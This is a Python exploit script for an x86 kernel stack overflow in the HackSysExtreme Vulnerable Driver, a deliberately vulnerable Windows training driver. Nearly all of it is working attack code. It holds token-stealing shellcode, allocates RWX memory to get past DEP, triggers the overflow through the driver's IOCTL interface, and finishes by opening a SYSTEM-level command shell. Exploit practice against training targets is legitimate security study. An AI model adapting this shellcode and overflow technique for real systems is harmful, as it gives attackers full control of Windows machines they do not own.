# HackSysExtreme Vulnerable Driver Kernel Exploit (x86 Stack Overflow)
# Author: Connor McGarr

import struct
import sys
import os
from ctypes import *
from subprocess import *

# Here, there is going to be a new function for each of the Windows API call.

# CreateFileA parameters
# HANDLE CreateFileA(
#   LPCSTR                lpFileName,
#   DWORD                 dwDesiredAccess,
#   DWORD                 dwShareMode,
#   LPSECURITY_ATTRIBUTES lpSecurityAttributes,
#   DWORD                 dwCreationDisposition,
#   DWORD                 dwFlagsAndAttributes,
#   HANDLE                hTemplateFile
# );

kernel32 = windll.kernel32

print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."

handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not handle or handle == -1:
    print "[+] Cannot get device handle..... Try again."
    sys.exit(0)

payload = ""
payload += bytearray(
    "\x60"                            # pushad
    "\x31\xc0"                        # xor eax,eax
    "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
    "\x8b\x40\x50"                    # mov eax,[eax+0x50]
    "\x89\xc1"                        # mov ecx,eax
    "\xba\x04\x00\x00\x00"            # mov edx,0x4
    "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    "\x75\xed"                        # jnz 0x1a
    "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
    "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
    "\x61"                            # popad
    "\x5d"                            # pop ebp
    "\xc2\x08\x00"                    # ret 0x8
)

# DeviceIoControl parameters
# BOOL DeviceIoControl(
#  HANDLE       hDevice,
#  DWORD        dwIoControlCode,
#  LPVOID       lpInBuffer,
#  DWORD        nInBufferSize,
#  LPVOID       lpOutBuffer,
#  DWORD        nOutBufferSize,
#  LPDWORD      lpBytesReturned,
#  LPOVERLAPPED lpOverlapped
# );

# Defeating DEP with VirtualAlloc. Creating RWX memory, and copying our shellcode in that region.
print "[+] Allocating RWX region for shellcode"

pointer = kernel32.VirtualAlloc(c_int(0),c_int(len(payload)),c_int(0x3000),c_int(0x40))
buf = (c_char * len(payload)).from_buffer(payload)

print "[+] Copying shellcode to newly allocated RWX region"
kernel32.RtlMoveMemory(c_int(pointer),buf,c_int(len(payload)))
shellcode = struct.pack("<L",pointer)

buffer = "A"*2080 + shellcode
buffer_length = len(buffer)

# 0X222003 = IOCTL code that will jump to TriggerStackOverflow() function
kernel32.DeviceIoControl(handle, 0x222003, buffer, buffer_length, None, 0, byref(c_ulong()), None)

# Using "start cmd" instead of cmd.exe because start.cmd opens a new cmd.exe process
print "[+] NT AUTHORITY\SYSTEM shell opening. Enjoy!"

Popen("start cmd", shell= True)
